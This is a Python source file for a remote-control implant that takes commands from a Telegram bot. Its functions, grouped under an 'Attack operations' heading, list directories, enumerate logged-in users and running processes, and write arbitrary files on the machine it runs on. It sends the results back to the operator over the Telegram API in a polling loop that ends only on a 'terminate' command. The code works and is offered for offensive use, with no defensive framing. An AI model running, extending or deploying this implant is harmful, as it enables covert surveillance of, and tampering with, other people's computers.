import os
import requests
import json
import time

import utils

SLEEP_TIME = 15
MAX_MESSAGE_LENGTH = 4000


# Parse JSON from URL request answer
def get_json(url):
    request = requests.get(url)
    if request.status_code == 200:
        return json.loads(request.content)
    return None


# Attack operations
# -----------------
def list_files(path):
    try:
        return '\n'.join(os.listdir(path))
    except FileNotFoundError:
        print("No such directory")
        return "Err: No such dir"


def get_active_users():
    stream = os.popen('w')
    stream.readline()
    stream.readline()  # get rid of a header and stats

    users = []
    for line in stream.readlines():
        splitted = line.split()
        users.append(splitted[0])
    return '\n'.join(users)


def get_running_processes():
    stream = os.popen('ps')
    stream.readline()  # get rid of a header and stats

    processes = []
    for line in stream.readlines():
        splitted = line.split()
        processes.append(splitted[-1])
    return '\n'.join(processes)


def write_to_file(file, data):
    try:
        f = open(file, "w")
        f.write(data)
        f.close()
        return "Ok"
    except FileNotFoundError:
        print("No such dir")
        return "Err: No such dir"


def parse_payload(command):
    splitted = command.split(" ")
    if splitted[0] == "ls" and len(splitted) >= 2:
        files = list_files(splitted[1])
        return utils.DIR_HTML.format(splitted[1]) + files
    elif splitted[0] == "users":
        return utils.USR_HTML + get_active_users()
    elif splitted[0] == "processes":
        return utils.PCS_HTML + get_running_processes()
    elif splitted[0] == "write" and len(splitted) >= 3:
        return utils.WRT_HTML + write_to_file(splitted[1], splitted[2])
    elif splitted[0] == "terminate":
        return "terminate"
    else:
        return utils.HELP


# Telegram API communication
# --------------------------
def get_status():
    answer = requests.get(utils.URL + "/getme")
    if answer.status_code == 200:
        print("Connection works")
    else:
        print("Connection does not work")


def mark_read(offset):
    answer = get_json(utils.URL + "/getUpdates?offset={}".format(offset))


def get_updates():
    answer = get_json(utils.URL + "/getUpdates")
    if (answer is None) or (not answer["ok"]):
        print("Wrong request for Updates")
        return

    for result in answer["result"]:
        yield result


def send_answer(message, chat_id):
    start = 0
    end = min(len(message), MAX_MESSAGE_LENGTH)

    while True:
        answer = get_json(utils.URL + "/sendMessage?text={}&chat_id={}&parse_mode={}".format(message[start:end], chat_id, "html"))
        if (answer is None) or (not answer["ok"]):
            print("Wrong answer")
            return

        if len(message) - end < MAX_MESSAGE_LENGTH:
            break
        start = end
        end = min(len(message), start + MAX_MESSAGE_LENGTH)


# Main runtime - loop until terminate message is obtained
if __name__ == "__main__":
    end = False
    while not end:
        update_id = -1
        for update in get_updates():
            update_id = update["update_id"] + 1
            message = update["message"]
            chat_id = message["chat"]["id"]

            response = parse_payload(message["text"])
            if response == "terminate":
                end = True
                break
            send_answer(response, chat_id)

        if update_id != -1:
            mark_read(update_id)
        if not end:
            time.sleep(SLEEP_TIME)
